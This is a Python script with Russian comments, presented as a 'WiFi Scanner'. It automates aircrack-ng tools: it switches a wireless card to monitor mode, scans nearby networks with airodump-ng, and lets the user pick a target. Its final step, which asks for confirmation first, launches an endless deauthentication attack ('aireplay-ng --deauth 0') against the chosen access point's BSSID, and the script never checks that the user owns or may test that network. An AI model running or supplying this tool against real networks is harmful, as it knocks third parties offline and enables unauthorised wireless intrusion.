#!/usr/bin/env python3
"""
WiFi Scanner - ПОКАЗЫВАЕТ ВЫВОД КОМАНД РЕАЛЬНО ВРЕМЯ
"""

import os
import sys
import time
import select
import subprocess

def run_command_show(cmd, timeout=None):
    """Выполняет команду и ПОКАЗЫВАЕТ её вывод в реальном времени"""
    print(f"\n\033[93m>>> {cmd}\033[0m")  # Желтый цвет для команды
    print("\033[90m" + "─" * 80 + "\033[0m")  # Серая линия
    
    # Запускаем команду с реальным выводом
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    
    # Читаем вывод в реальном времени
    output_lines = []
    try:
        while True:
            # Проверяем есть ли вывод
            readable, _, _ = select.select([process.stdout], [], [], 0.1)
            
            if readable:
                line = process.stdout.readline()
                if line:
                    print(line.rstrip())  # Выводим в реальном времени
                    output_lines.append(line)
            
            # Проверяем завершился ли процесс
            if process.poll() is not None:
                # Читаем остаток
                for line in process.stdout:
                    print(line.rstrip())
                    output_lines.append(line)
                break
                
            if timeout:
                # Здесь можно добавить таймаут, но для наших команд он не нужен
                pass
                
    except KeyboardInterrupt:
        print("\n\033[91m[!] Прервано пользователем\033[0m")
        process.terminate()
        time.sleep(1)
    
    print("\033[90m" + "─" * 80 + "\033[0m")  # Серая линия
    return ''.join(output_lines)

def main():
    print("\033[92m" + "="*80 + "\033[0m")
    print("\033[92m                    WiFi SCANNER - РЕАЛЬНЫЙ ВЫВОД\033[0m")
    print("\033[92m" + "="*80 + "\033[0m")
    
    # Проверка прав
    if os.geteuid() != 0:
        print("\033[91m[!] Запускай с sudo: sudo python3 script.py\033[0m")
        sys.exit(1)
    
    # ШАГ 1: airmon-ng start wlan0 (ПОКАЗЫВАЕТ ВЫВОД!)
    print("\n\033[94m[1/5] ЗАПУСКАЮ: sudo airmon-ng start wlan0\033[0m")
    run_command_show("sudo airmon-ng start wlan0")
    time.sleep(2)
    
    # Проверяем создался ли интерфейс
    interface = "wlan0mon"
    result = subprocess.run(
        "iwconfig 2>/dev/null | grep -o 'wlan[0-9]mon\|mon[0-9]' | head -1",
        shell=True, capture_output=True, text=True
    )
    
    if result.stdout.strip():
        interface = result.stdout.strip()
    
    print(f"\n\033[92m[✓] Использую интерфейс: {interface}\033[0m")
    
    # ШАГ 2: airodump-ng wlan0mon (ПОКАЗЫВАЕТ В РЕАЛЬНОМ ВРЕМЕНИ!)
    print("\n\033[94m[2/5] ЗАПУСКАЮ: sudo airodump-ng wlan0mon (15 секунд)\033[0m")
    print("\033[93mСмотри список сетей ниже (BSSID и Channel):\033[0m")
    
    # Сохраняем вывод в файл для парсинга
    print("\033[90m" + "═" * 80 + "\033[0m")
    
    # Запускаем airodump-ng с реальным выводом
    import threading
    
    # Переменная для хранения вывода
    scan_output = []
    
    def run_airodump():
        process = subprocess.Popen(
            f"sudo timeout 15 airodump-ng {interface}",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        for line in process.stdout:
            print(line.rstrip())
            scan_output.append(line)
    
    # Запускаем в отдельном потоке
    scan_thread = threading.Thread(target=run_airodump)
    scan_thread.start()
    scan_thread.join()  # Ждем завершения
    
    print("\033[90m" + "═" * 80 + "\033[0m")
    
    # Парсим BSSID и каналы из вывода
    networks = []
    for line in scan_output:
        # Ищем строки с MAC адресами и каналами
        if ':' in line and any(x in line for x in ['WPA', 'WEP', 'OPN', 'WPA2']):
            parts = line.split()
            if len(parts) >= 6:
                bssid = parts[0]
                channel = parts[5] if len(parts) > 5 else "?"
                
                # Проверяем что это MAC
                if len(bssid) == 17 and bssid.count(':') == 5:
                    # Пробуем найти ESSID
                    essid = ' '.join(parts[13:]) if len(parts) > 13 else "[Скрытая]"
                    networks.append({
                        'bssid': bssid,
                        'channel': channel,
                        'essid': essid[:30]  # Обрезаем длинные названия
                    })
    
    # ШАГ 3: Выбор из списка
    print("\n\033[94m[3/5] ВЫБОР СЕТИ ИЗ СПИСКА:\033[0m")
    
    if not networks:
        print("\033[91m[!] Не удалось распознать сети в выводе\033[0m")
        print("\033[93mВведи данные вручную:\033[0m")
        bssid = input("BSSID (MAC): ").strip()
        channel = input("Channel: ").strip()
        essid = input("ESSID (не обязательно): ").strip()
        
        if bssid and channel:
            networks = [{'bssid': bssid, 'channel': channel, 'essid': essid or "Ручной ввод"}]
    else:
        # Показываем пронумерованный список
        print("\n\033[92mНайденные сети:\033[0m")
        for i, net in enumerate(networks[:15], 1):  # Показываем первые 15
            print(f"\033[94m[{i}]\033[0m {net['essid']}")
            print(f"     BSSID: {net['bssid']} | Канал: {net['channel']}")
            print()
    
    if not networks:
        print("\033[91m[!] Нет данных о сетях. Выход.\033[0m")
        run_command_show(f"sudo airmon-ng stop {interface}")
        sys.exit(0)
    
    # Выбор сети
    while True:
        try:
            choice = input(f"\n\033[93mВыбери сеть (1-{len(networks)}) или 0 для выхода: \033[0m")
            
            if choice == '0':
                print("\033[92m[✓] Выход...\033[0m")
                break
            
            choice_num = int(choice) - 1
            if 0 <= choice_num < len(networks):
                selected = networks[choice_num]
                
                print(f"\n\033[92m[✓] Выбрано: {selected['essid']}\033[0m")
                print(f"    BSSID: {selected['bssid']}")
                print(f"    Канал: {selected['channel']}")
                
                # ШАГ 4: iw dev wlan0mon set channel
                print(f"\n\033[94m[4/5] МЕНЯЮ КАНАЛ: sudo iw dev {interface} set channel {selected['channel']}\033[0m")
                run_command_show(f"sudo iw dev {interface} set channel {selected['channel']}")
                
                # ШАГ 5: aireplay-ng --deauth
                print("\n\033[94m[5/5] DEAUTH АТАКА (опционально)\033[0m")
                confirm = input("\033[93mЗапустить deauth атаку? (y/n): \033[0m")
                
                if confirm.lower() == 'y':
                    print(f"\n\033[91m[!] ЗАПУСКАЮ DEAUTH: sudo aireplay-ng --deauth 0 -a {selected['bssid']} {interface}\033[0m")
                    print("\033[93mНажми Ctrl+C для остановки\033[0m")
                    run_command_show(f"sudo aireplay-ng --deauth 0 -a {selected['bssid']} {interface}")
                
                break
            else:
                print(f"\033[91m[!] Выбери от 1 до {len(networks)}\033[0m")
                
        except ValueError:
            print("\033[91m[!] Вводи число!\033[0m")
        except KeyboardInterrupt:
            print("\n\033[92m[✓] Прервано\033[0m")
            break
    
    # Восстановление
    print("\n\033[94m[ВОССТАНОВЛЕНИЕ] Возвращаю WiFi в нормальный режим\033[0m")
    run_command_show(f"sudo airmon-ng stop {interface}")
    run_command_show("sudo systemctl restart NetworkManager")
    
    print("\n\033[92m" + "="*80 + "\033[0m")
    print("\033[92m                    ВСЁ ЗАВЕРШЕНО!\033[0m")
    print("\033[92m" + "="*80 + "\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[92m[✓] Программа завершена\033[0m")
        os.system("sudo airmon-ng stop wlan0mon 2>/dev/null")
        os.system("sudo airmon-ng stop mon0 2>/dev/null")
        os.system("sudo systemctl restart NetworkManager 2>/dev/null")
    except Exception as e:
        print(f"\n\033[91m[!] Ошибка: {e}\033[0m")